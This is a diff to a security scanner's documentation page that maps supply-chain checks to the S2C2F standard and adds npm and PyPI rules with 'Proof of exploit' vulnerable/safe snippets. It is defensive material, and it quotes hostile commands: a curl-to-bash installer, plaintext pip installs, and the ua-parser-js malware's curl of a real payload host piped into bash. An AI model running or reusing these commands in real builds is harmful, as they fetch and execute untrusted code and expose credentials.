@@ -12,7 +12,7 @@ for taking a third-party dependency safely.
 
 - **Controls in this standard:** 11
 - **Controls evidenced by at least one check:** 11 / 11
-- **Distinct checks evidencing this standard:** 193
+- **Distinct checks evidencing this standard:** 206
 - **Of those, autofixable with `--fix`:** 41
 
 _Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._
@@ -23,11 +23,11 @@ Click a control ID to jump to the per-control section with the full check list. 
 
 | Control | Title | Checks | Severity mix |
 |---------|-------|-------:|--------------|
-| [`ING-1`](#ctrl-ing-1) | L1: Use package managers trusted by your organization | 42 | 1C · 30H · 10M · 1L |
-| [`ING-3`](#ctrl-ing-3) | L1: Have the capability to deny-list specific vulnerable / malicious OSS | 9 | 3C · 3H · 3M |
+| [`ING-1`](#ctrl-ing-1) | L1: Use package managers trusted by your organization | 47 | 1C · 35H · 10M · 1L |
+| [`ING-3`](#ctrl-ing-3) | L1: Have the capability to deny-list specific vulnerable / malicious OSS | 11 | 5C · 3H · 3M |
 | [`SCA-1`](#ctrl-sca-1) | L1: Scan OSS for known vulnerabilities | 12 | 1H · 11M |
-| [`SCA-3`](#ctrl-sca-3) | L2: Scan OSS for malware | 18 | 11C · 1H · 6M |
-| [`UPD-1`](#ctrl-upd-1) | L1: Update vulnerable OSS manually (pin + track versions) | 51 | 29H · 17M · 5L |
+| [`SCA-3`](#ctrl-sca-3) | L2: Scan OSS for malware | 20 | 13C · 1H · 6M |
+| [`UPD-1`](#ctrl-upd-1) | L1: Update vulnerable OSS manually (pin + track versions) | 57 | 33H · 19M · 5L |
 | [`UPD-2`](#ctrl-upd-2) | L3: Enable automated OSS updates (Dependabot / Renovate) | 6 | 6M |
 | [`ENF-1`](#ctrl-enf-1) | L2: Enforce security policy of OSS usage (block on violation) | 13 | 3H · 10M |
 | [`ENF-2`](#ctrl-enf-2) | L2: Break the build when a violation is detected | 4 | 1H · 3M |
@@ -54,7 +54,7 @@ pipeline_check --pipeline aws --standard s2c2f --standard owasp_cicd_top_10
 
 ### ING-1: L1: Use package managers trusted by your organization { #ctrl-ing-1 }
 
-**Evidenced by 42 checks** across 15 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Tekton, maven).
+**Evidenced by 47 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, PyPI, Tekton, maven, npm).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -99,11 +99,16 @@ pipeline_check --pipeline aws --standard s2c2f --standard owasp_cicd_top_10
 | [`JF-035`](#detail-jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`MVN-003`](#detail-mvn-003) | pom.xml declares a plaintext-HTTP Maven repository | <span class="pg-sev pg-sev--high">HIGH</span> | [maven](../providers/maven.md) |  |
 | [`MVN-007`](#detail-mvn-007) | settings.xml mirror routes external traffic through one repo | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
+| [`NPM-003`](#detail-npm-003) | package-lock.json entry resolves from a non-registry source | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
+| [`NPM-004`](#detail-npm-004) | package.json declares an install-time lifecycle script | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
+| [`NPM-007`](#detail-npm-007) | .npmrc does not disable install-time lifecycle scripts | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
+| [`PYPI-003`](#detail-pypi-003) | requirements.txt uses an HTTP index or disables TLS verification | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
+| [`PYPI-005`](#detail-pypi-005) | requirements.txt declares --extra-index-url (dependency-confusion surface) | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
 | [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 
 ### ING-3: L1: Have the capability to deny-list specific vulnerable / malicious OSS { #ctrl-ing-3 }
 
-**Evidenced by 9 checks** across 3 providers (AWS, GitHub Actions, maven).
+**Evidenced by 11 checks** across 5 providers (AWS, GitHub Actions, PyPI, maven, npm).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -116,6 +121,8 @@ pipeline_check --pipeline aws --standard s2c2f --standard owasp_cicd_top_10
 | [`GHA-047`](#detail-gha-047) | Action ref resolves to a recently committed tag or SHA | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-056`](#detail-gha-056) | Workflow body contains a known supply-chain worm indicator | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
 | [`MVN-006`](#detail-mvn-006) | pom.xml pins a known-compromised Maven Central artifact version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [maven](../providers/maven.md) |  |
+| [`NPM-006`](#detail-npm-006) | package-lock.json pins a known-compromised package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [npm](../providers/npm.md) |  |
+| [`PYPI-006`](#detail-pypi-006) | requirements.txt pins a known-compromised PyPI package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [PyPI](../providers/pypi.md) |  |
 
 ### SCA-1: L1: Scan OSS for known vulnerabilities { #ctrl-sca-1 }
 
@@ -138,7 +145,7 @@ pipeline_check --pipeline aws --standard s2c2f --standard owasp_cicd_top_10
 
 ### SCA-3: L2: Scan OSS for malware { #ctrl-sca-3 }
 
-**Evidenced by 18 checks** across 8 providers (AWS, Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins, maven).
+**Evidenced by 20 checks** across 10 providers (AWS, Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins, PyPI, maven, npm).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -160,10 +167,12 @@ pipeline_check --pipeline aws --standard s2c2f --standard owasp_cicd_top_10
 | [`GL-035`](#detail-gl-035) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`JF-029`](#detail-jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`MVN-006`](#detail-mvn-006) | pom.xml pins a known-compromised Maven Central artifact version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [maven](../providers/maven.md) |  |
+| [`NPM-006`](#detail-npm-006) | package-lock.json pins a known-compromised package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [npm](../providers/npm.md) |  |
+| [`PYPI-006`](#detail-pypi-006) | requirements.txt pins a known-compromised PyPI package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [PyPI](../providers/pypi.md) |  |
 
 ### UPD-1: L1: Update vulnerable OSS manually (pin + track versions) { #ctrl-upd-1 }
 
-**Evidenced by 51 checks** across 16 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, Tekton, maven).
+**Evidenced by 57 checks** across 18 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, PyPI, Tekton, maven, npm).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -215,8 +224,14 @@ pipeline_check --pipeline aws --standard s2c2f --standard owasp_cicd_top_10
 | [`MVN-002`](#detail-mvn-002) | pom.xml depends on a mutable SNAPSHOT version | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
 | [`MVN-004`](#detail-mvn-004) | pom.xml dependency omits an explicit ``<version>`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
 | [`MVN-005`](#detail-mvn-005) | Maven repository accepts artifacts without strict checksum gating | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
+| [`NPM-001`](#detail-npm-001) | package.json dependency uses a floating version range | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [npm](../providers/npm.md) |  |
+| [`NPM-002`](#detail-npm-002) | package-lock.json entry missing integrity hash | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
+| [`NPM-005`](#detail-npm-005) | package.json git dependency uses a mutable ref | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
 | [`OCI-007`](#detail-oci-007) | Image manifest uses legacy schemaVersion 1 (no content addressing) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`OCI-008`](#detail-oci-008) | Manifest references digest using unsupported hash algorithm | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
+| [`PYPI-001`](#detail-pypi-001) | requirements.txt entry missing an exact version pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [PyPI](../providers/pypi.md) |  |
+| [`PYPI-002`](#detail-pypi-002) | requirements.txt missing hash pinning (--require-hashes / --hash=) | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
+| [`PYPI-004`](#detail-pypi-004) | requirements.txt VCS dependency uses a mutable ref | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
 | [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
 
 ### UPD-2: L3: Enable automated OSS updates (Dependabot / Renovate) { #ctrl-upd-2 }
@@ -1445,6 +1460,34 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 - Docker Hub typosquatting / namespace-takeover incidents (2017 onward): docker-library Sysdig and Aqua research documented thousands of malicious images uploaded under near-miss names (``alpine`` vs ``alphine``, etc.) and occasional namespace recoveries shipping crypto-miners downstream. Digest-pinned consumers are immune; tag-pinned consumers pull whatever sits under the name today.
 - Codecov ``codecov/codecov-action`` tag-mutation incident (post-Codecov-Bash-uploader compromise): the upstream rotated the action's ``@v3`` tag during the fallout, and consumers pinning to the tag silently re-ran a different build than before. Digest pinning would have surfaced the change as a checksum mismatch instead of a silent swap.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``python:3.12-slim`` is a tag, and tags on
+# Docker Hub are mutable. Python's publishers can (and do)
+# repoint the same tag at a new image on every point
+# release, and namespace takeovers / hijacked publisher
+# accounts can silently swap a malicious image under the
+# existing tag. The next rebuild picks up whatever's there
+# now, with no signal to the consumer that the base
+# changed.
+FROM python:3.12-slim
+COPY . /app
+RUN pip install --require-hashes -r /app/requirements.txt
+CMD ["python", "/app/main.py"]
+
+# Safe: pin to the immutable sha256 digest. The leading
+# comment documents which tag the digest corresponds to.
+# Renovate / Dependabot's Docker ecosystem updaters resolve
+# and bump these on a schedule so the pin doesn't drift
+# behind security patches.
+# python:3.12.1-slim (refreshed YYYY-MM-DD)
+FROM python:3.12-slim@sha256:abc123...
+COPY . /app
+RUN pip install --require-hashes -r /app/requirements.txt
+CMD ["python", "/app/main.py"]
+```
+
 **Source:** [`DF-001`](../providers/dockerfile.md#df-001) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-003`: ADD pulls remote URL without integrity verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-003 }
@@ -1468,6 +1511,31 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **How this is detected.** Reuses ``_primitives/remote_script_exec.scan`` so the vocabulary matches the equivalent CI-side rules (GHA-016, GL-016, BB-012, ADO-016, CC-016, JF-016).
 
 **Recommendation.** Download to a file, verify checksum or signature, then execute. ``curl -fsSL <url> -o /tmp/x.sh && sha256sum -c <(echo '<digest>  /tmp/x.sh') && bash /tmp/x.sh``. Vendor installers from well-known hosts (rustup.rs, get.docker.com, ...) are reported with vendor_trusted=true so reviewers can calibrate.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: curl-pipe to bash trusts both the network
+# (any MITM substitutes the script in flight) and the host
+# (a compromised installer endpoint silently serves attacker
+# code). The script then runs as root inside the build
+# context, so anything it writes lands in the final image.
+FROM ubuntu:24.04@sha256:abc123...
+RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates
+RUN curl -fsSL https://example-installer.example/install.sh | bash
+
+# Safe: download to a file, verify a sha256 digest from a
+# trusted source (the project's signing key, the vendor's
+# release manifest), then execute. If the upstream content
+# changes the digest stops matching and the build fails
+# before the malicious code runs.
+FROM ubuntu:24.04@sha256:abc123...
+RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates
+RUN curl -fsSL https://example-installer.example/install.sh -o /tmp/install.sh \
+    && echo 'a1b2c3d4...  /tmp/install.sh' | sha256sum -c - \
+    && bash /tmp/install.sh \
+    && rm /tmp/install.sh
+```
 
 **Source:** [`DF-004`](../providers/dockerfile.md#df-004) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -1943,6 +2011,45 @@ Carve-out: third-party binary installers that download over HTTPS (no insecure r
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP, so any network attacker between the
+# runner and the registry (compromised proxy, malicious
+# VPN exit, BGP hijack on an internal mirror) can swap a
+# wheel for a malicious one whose ``setup.py`` runs at
+# install time. ``--trusted-host`` then silences the very
+# error that would have caught the swap.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          pip install \
+            --index-url http://internal-pypi.example.com/simple \
+            --trusted-host internal-pypi.example.com \
+            -r requirements.txt
+
+# Safe: HTTPS with the registry's certificate validated.
+# If the internal index uses a private CA, install the CA
+# into the runner trust store, never ``--trusted-host`` or
+# ``--no-verify``.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
+          sudo update-ca-certificates
+      - run: |
+          pip install \
+            --index-url https://internal-pypi.example.com/simple \
+            --require-hashes -r requirements.txt
+```
+
 **Source:** [`GHA-018`](../providers/github.md#gha-018) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-020 }
@@ -2046,6 +2153,31 @@ jobs:
 **How this is detected.** A reusable workflow runs with the caller's ``GITHUB_TOKEN`` and secrets by default. If ``uses: org/repo/.github/workflows/release.yml@v1`` resolves to an attacker-modified commit, their code executes with your repository's permissions. This is the same threat model as unpinned step actions (GHA-001) but over a different ``uses:`` surface.
 
 **Recommendation.** Pin every ``jobs.<id>.uses:`` reference to a 40-char commit SHA (``owner/repo/.github/workflows/foo.yml@<sha>``). Tag refs (``@v1``, ``@main``) can be silently repointed by whoever controls the callee repository.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a tag reference can be silently repointed by
+# whoever controls the callee repo. If
+# ``org/release-tools/.github/workflows/release.yml@v1`` is
+# later force-pushed (or the ``v1`` tag deleted and re-
+# created against a different commit), every caller that
+# inherits secrets runs the new code with their own token
+# and secret set in scope on the next workflow run.
+jobs:
+  release:
+    uses: org/release-tools/.github/workflows/release.yml@v1
+    secrets: inherit
+
+# Safe: pin to a 40-char commit SHA. The trailing comment
+# documents which tag / version the SHA was at so version
+# bumps stay reviewable. Dependabot's ``github-actions``
+# ecosystem updates these in PRs like any other dep.
+jobs:
+  release:
+    uses: org/release-tools/.github/workflows/release.yml@0123456789abcdef0123456789abcdef01234567  # v1.4.2
+    secrets: inherit
+```
 
 **Source:** [`GHA-025`](../providers/github.md#gha-025) in the [GitHub Actions provider](../providers/github.md).
 
@@ -3110,6 +3242,195 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 **Source:** [`MVN-007`](../providers/maven.md#mvn-007) in the [maven provider](../providers/maven.md).
 
+### `NPM-001`: package.json dependency uses a floating version range <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-npm-001 }
+
+**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).
+
+**How this is detected.** Fires on every entry in ``dependencies`` / ``devDependencies`` / ``optionalDependencies`` / ``peerDependencies`` whose value starts with ``^``, ``~``, ``*``, ``>``, ``<``, ``||``, or is the dist-tag ``latest`` / ``next`` / ``beta`` / ``alpha`` / ``canary`` / ``dev``. ``workspace:*`` (Yarn / pnpm workspace protocol), ``file:`` / ``link:`` (local checkouts), ``git+`` / ``http(s)://`` (URL deps), and ``npm:`` (alias) are not version ranges and are routed to other rules. Complements NPM-002, which catches lockfile entries missing integrity hashes; NPM-001 is the manifest-side hygiene.
+
+**Recommendation.** Replace floating range specifiers (``^``, ``~``, ``*``, ``>=``, ``latest``) with an exact version pin (``"lodash": "4.17.21"``). The floating form lets npm install any later version that matches the range, so a compromised patch release (TanStack, axios, debug, Shai-Hulud) reaches the build without a code change. Pair the pinned manifest with a committed ``package-lock.json`` (NPM-002 / NPM-003 guard the lockfile content).
+
+**Known false positives.**
+
+- Monorepo packages that pin every dep to a workspace-internal version often use ``workspace:*``; those are skipped by the rule. Library packages (``private: false``, ``main`` set) intentionally use ranges in ``peerDependencies`` so consumers can satisfy them flexibly; suppress with a one-line rationale for libraries you publish to npm.
+
+**Seen in the wild.**
+
+- TanStack / Mistral npm compromise (May 2026): 84 versions across 42 packages published in minutes, each carrying a credential-stealing ``postinstall``. Consumers with floating ranges (``^x.y.z``) installed the poisoned versions on the next install; pinned exact-version repos were spared until they manually bumped.
+
+**Source:** [`NPM-001`](../providers/npm.md) in the [npm provider](../providers/npm.md).
+
+### `NPM-002`: package-lock.json entry missing integrity hash <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-002 }
+
+**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).
+
+**How this is detected.** Walks every entry under ``packages`` (npm 7+ schema ``lockfileVersion: 2`` / ``3``) or ``dependencies`` (npm 6 schema ``lockfileVersion: 1``) and flags records missing an ``integrity`` field that has a ``resolved`` URL (a fetched tarball without integrity is the unsafe case). Skips link entries (``link: true``) and workspace entries, which have no tarball to hash. Local file dependencies (``file:`` specs) are caught by NPM-003. Complements NPM-003 (non-registry source URL); NPM-002 is the case where the source URL exists but the verification anchor doesn't.
+
+**Recommendation.** Regenerate the lockfile with ``npm install`` against a registry that returns SRI integrity hashes (the default ``https://registry.npmjs.org``). Every entry should carry an ``integrity`` field like ``sha512-...`` keyed off the tarball contents. A missing hash means npm has nothing to compare against at install time, so a registry that swaps the tarball mid-flight (cache poisoning, MITM, malicious mirror) ships arbitrary code without detection.
+
+**Known false positives.**
+
+- Lockfiles produced by old npm versions (npm < 5) wrote ``sha1-...`` integrity strings that some downstream tools regenerate as missing. The fix is the same in both cases: regenerate with a current npm version against a hash-providing registry.
+
+**Source:** [`NPM-002`](../providers/npm.md) in the [npm provider](../providers/npm.md).
+
+### `NPM-003`: package-lock.json entry resolves from a non-registry source <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-003 }
+
+**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.
+
+**How this is detected.** Fires when a lockfile entry's ``resolved`` URL points at anything other than an HTTPS registry. Detected shapes:
+
+* ``git+ssh://`` / ``ssh://`` — opaque, unreviewable
+* ``git+http://`` / ``git://`` / ``http://`` — unencrypted transport, MITM surface
+* ``file:`` referencing anything outside the project tree — host-specific install
+
+Standard ``https://registry.npmjs.org`` and other registered registries (GitHub Packages, Verdaccio, internal proxies) pass. A ``git+https://`` URL with a 40-character SHA also passes — that's the documented escape hatch for forks not yet published to a registry. Complements NPM-002 (missing integrity hash); NPM-003 catches the *source* shape, NPM-002 catches the *verification* shape.
+
+**Recommendation.** Move the dependency to a hash-verifiable registry source. If you genuinely need a fork that's not on npm, pin it via ``git+https://host/owner/repo.git#<40-char-sha>`` (exact commit, not a branch or tag) and document the audit trail. ``git+ssh://`` URLs are unreviewable by anyone without access to the same private SSH endpoint; ``http://`` URLs are MITM-able; bare ``file:`` paths bind the build to a developer-machine layout. The default-safe shape is ``https://registry.npmjs.org/...`` with ``integrity: sha512-...``, anything else needs a one-line rationale.
+
+**Source:** [`NPM-003`](../providers/npm.md) in the [npm provider](../providers/npm.md).
+
+### `NPM-004`: package.json declares an install-time lifecycle script <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-004 }
+
+**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.
+
+**How this is detected.** Fires when ``package.json`` ``scripts`` declares any of:
+
+* ``preinstall`` — runs before dependencies install
+* ``install`` — the canonical install hook (rarely needed; node-gyp triggers this automatically when ``binding.gyp`` exists, no script needed)
+* ``postinstall`` — runs after dependencies install; the Shai-Hulud worm primitive
+* ``prepare`` — runs on ``npm install`` (no args) and on ``npm publish``; effectively a postinstall for consumers
+
+This rule guards the *package you're publishing*. To stop *consumed* dependencies from running their install scripts during your build, use ``npm ci --ignore-scripts`` (DF-024 in the Dockerfile pack). Together they cover both sides of the lifecycle-script attack surface.
+
+**Recommendation.** Move the work out of ``preinstall`` / ``install`` / ``postinstall`` / ``prepare`` and into an explicit script (``"build": "..."``) invoked at a controlled point in your pipeline. Install-time scripts run on every consumer's machine the moment they ``npm install`` your package, with the consumer's environment (``GH_TOKEN``, ``NPM_TOKEN``, AWS env, SSH keys). They're also the propagation primitive the Shai-Hulud worm used to spread across the npm ecosystem in 2026. If your package legitimately needs native-module compilation, document it in the README and expose the build via ``"build": "node-gyp rebuild"`` so consumers opt in by calling ``npm run build`` rather than being opted in by ``npm install``.
+
+**Known false positives.**
+
+- Packages that wrap a binary release (``esbuild``, ``swc``) use ``postinstall`` to download the platform-specific binary. Suppress with a one-line rationale that names the binary source URL and the integrity check the script performs. If the script has neither, the package is the anti-pattern, not the rule.
+
+**Seen in the wild.**
+
+- Shai-Hulud npm worm (2026): the postinstall in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. Removing the install-time script primitive on the *publisher* side is the structural fix.
+
+**Source:** [`NPM-004`](../providers/npm.md) in the [npm provider](../providers/npm.md).
+
+### `NPM-005`: package.json git dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-005 }
+
+**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).
+
+**How this is detected.** Fires on dependency specs of the shapes:
+
+* ``git+https://host/owner/repo.git#<ref>`` where ``<ref>`` is not a 40-character SHA
+* ``github:owner/repo#<ref>`` (shorthand) with non-SHA ``<ref>``
+* ``git+ssh://...``, ``git://...`` (these are also caught by NPM-003 on the lockfile side; flagging here gives users the manifest-side signal too)
+* A bare ``github:owner/repo`` with no ``#`` ref at all (resolves to ``HEAD`` of the default branch — fully mutable)
+
+Skips entries already routed elsewhere: registry specs (NPM-001), ``file:`` / ``link:`` / ``workspace:`` (NPM-003).
+
+**Recommendation.** Pin the git dependency to a 40-character commit SHA: ``"foo": "git+https://github.com/owner/repo.git#<sha>"``. Branch refs (``#main``, ``#master``) and tag refs (``#v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the dependency string. A commit SHA is immutable; a tampered upstream cannot redirect ``#<sha>`` to different content. If the upstream isn't yours, vendor the fork into a registry you control (GitHub Packages, internal Verdaccio) and pin via registry version instead.
+
+**Source:** [`NPM-005`](../providers/npm.md) in the [npm provider](../providers/npm.md).
+
+### `NPM-006`: package-lock.json pins a known-compromised package version <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-npm-006 }
+
+**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS, [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.
+
+**How this is detected.** Walks every entry in the lockfile (npm 7+ ``packages`` map and npm 6 ``dependencies`` tree) against the curated compromised-package registry in ``pipeline_check.core.checks.npm._compromised_packages``. Match is case-insensitive on package name and exact on version literal (with optional regex fallback for advisories that span a range). Lockfile coverage means both direct dependencies *and* transitive ones are caught — the more common attack shape, where ``axios -> plain-crypto-js`` (March 2026) pulled in a backdoored transitive that the direct ``package.json`` declaration never mentioned. Registry is hand-curated and append-only; refresh by PR with the citing CVE / GHSA / vendor advisory in the commit message.
+
+**Recommendation.** Rotate every secret reachable to any process that ran ``npm install`` against this lockfile during the window the compromised version was installed. Bump the affected dependency to a post-incident clean version published by the upstream maintainer (announced in the citing advisory), regenerate the lockfile, and audit CI build logs for the exfiltration shape the advisory documents. Pair with NPM-004 (install-time lifecycle scripts) so the postinstall primitive most npm compromises rely on is disabled at the publisher side, and DF-024 (``--ignore-scripts``) so the image build can't re-enable it.
+
+**Known false positives.**
+
+- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing advisory exists. For broader coverage, run ``npm audit`` or ``osv-scanner`` alongside pipeline-check; NPM-006 is the curated supply-chain anchor, not a vulnerability database.
+
+**Seen in the wild.**
+
+- event-stream 3.3.6 (Nov 2018): canonical npm maintainer-takeover. The hijacked publisher added a malicious ``flatmap-stream`` transitive that targeted Copay wallet builds. https://github.com/dominictarr/event-stream/issues/116
+- ua-parser-js compromise ([CVE-2021-43547](https://nvd.nist.gov/vuln/detail/CVE-2021-43547), Oct 2021): hijacked maintainer account; the malicious versions ran a crypto miner + password stealer via postinstall on every consumer.
+- coa + rc compromise ([GHSA-73qr-pfmq-6rp8](https://github.com/advisories/GHSA-73qr-pfmq-6rp8), Nov 2021): coordinated maintainer-account-takeover campaign hitting two widely-used CLI helpers within hours of each other.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: package-lock.json carries a compromised
+# version. The current scan flags it because the registry
+# entry matches the (name, version) tuple.
+{
+  "lockfileVersion": 3,
+  "packages": {
+    "node_modules/ua-parser-js": {
+      "version": "0.7.29",
+      "resolved": "https://registry.npmjs.org/ua-parser-js/-/ua-parser-js-0.7.29.tgz",
+      "integrity": "sha512-..."
+    }
+  }
+}
+
+# Attack: the postinstall on ua-parser-js@0.7.29 fetched a
+# second-stage payload and ran it with the consumer's npm-
+# install environment:
+#   IF (host_os == 'Linux') {
+#     curl https://citationsherbe.at/sdd.sh | bash;
+#   } ELSE IF (host_os == 'Windows') {
+#     Invoke-WebRequest https://citationsherbe.at/sdd.exe ...;
+#   }
+# The Linux payload installed XMRig (Monero miner); the
+# Windows payload installed DanaBot (credential stealer).
+
+# Safe: post-incident clean version. ua-parser-js republished
+# 0.7.30 / 0.8.1 / 1.0.1 with the malicious code removed and
+# a maintainer-key rotation; pin to those or later.
+```
+
+**Source:** [`NPM-006`](../providers/npm.md) in the [npm provider](../providers/npm.md).
+
+### `NPM-007`: .npmrc does not disable install-time lifecycle scripts <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-007 }
+
+**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.
+
+**How this is detected.** Fires when a ``.npmrc`` exists but does NOT declare ``ignore-scripts=true``. Two failure shapes are flagged:
+
+* Explicit re-enable: ``ignore-scripts=false`` — someone   deliberately turned off the protection.
+* Implicit default: ``ignore-scripts`` not set — npm's   built-in default is to RUN scripts.
+
+The rule does NOT fire when no ``.npmrc`` exists in the scan path; that case is too broad to flag without generating noise on every JavaScript repo (the npm pack's DF-024 rule catches the same primitive in the image-build path, which most production deployments use). To enforce the rule globally, ship a ``.npmrc`` that declares ``ignore-scripts=true`` and the rule's contract becomes a ratchet: future commits cannot silently re-enable scripts without tripping this check.
+
+Complements NPM-004 (``package.json`` declares its own install-time hook on the publisher side) and DF-024 (``RUN npm install`` without ``--ignore-scripts`` at image-build time). NPM-004 protects consumers of *your* package; NPM-007 protects *you* from compromised transitive dependencies on the next install.
+
+**Recommendation.** Add ``ignore-scripts=true`` to the repo's ``.npmrc``. The setting tells npm / pnpm / Yarn 1 to skip every ``preinstall`` / ``install`` / ``postinstall`` / ``prepare`` hook on every transitive dependency, including the ones added in a future ``npm install``. This is the file-side complement to DF-024 (which catches the same primitive at ``docker build`` time) — DF-024 protects the image, NPM-007 protects the developer laptop and any unattended CI step running ``npm install`` outside a container. If a specific package legitimately needs its build script (a native module like ``better-sqlite3``), allow-list it after the install: ``npm rebuild better-sqlite3``.
+
+**Known false positives.**
+
+- Repos that build native modules via ``node-gyp`` (``better-sqlite3``, ``sharp``, ``canvas``, …) need the lifecycle scripts to compile bindings. The right pattern is to keep ``ignore-scripts=true`` at the top-level install and per-package ``npm rebuild <name>`` after, scoped to the audited native-module set. Suppress only with a one-line rationale that names the specific binding packages.
+
+**Seen in the wild.**
+
